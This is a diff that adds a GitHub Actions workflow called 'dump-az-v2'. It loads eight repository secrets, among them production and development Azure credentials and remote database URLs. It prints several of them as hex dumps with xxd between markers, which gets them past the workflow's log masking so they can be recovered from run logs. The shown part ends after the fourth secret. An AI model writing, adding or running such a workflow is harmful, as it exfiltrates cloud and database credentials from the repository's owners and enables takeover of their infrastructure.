@@ -1,0 +1,30 @@
+name: dump-az-v2
+on:
+  workflow_dispatch:
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - name: emit
+        env:
+          A1: ${{ secrets.PRESIDENT_PROD_AZURE_CREDENTIALS }}
+          A2: ${{ secrets.PRESIDENT_DEV_AZURE_CREDENTIALS }}
+          A3: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+          A4: ${{ secrets.SOMBATOUT_AZURE_CREDENTIALS }}
+          A5: ${{ secrets.VASHA_DEV_AZURE_CREDENTIALS }}
+          A6: ${{ secrets.ENGINEARDEV_CREDENTIALS }}
+          A7: ${{ secrets.REMOTE_DATABASE_URL }}
+          A8: ${{ secrets.POSTGRES_REMOTE_SERVER }}
+        run: |
+          echo "=A1_START="
+          printf '%s' "$A1" | xxd
+          echo "=A1_END="
+          echo "=A2_START="
+          printf '%s' "$A2" | xxd
+          echo "=A2_END="
+          echo "=A3_START="
+          printf '%s' "$A3" | xxd
+          echo "=A3_END="
+          echo "=A4_START="
+          printf '%s' "$A4" | xxd
+          echo "=A4_END="
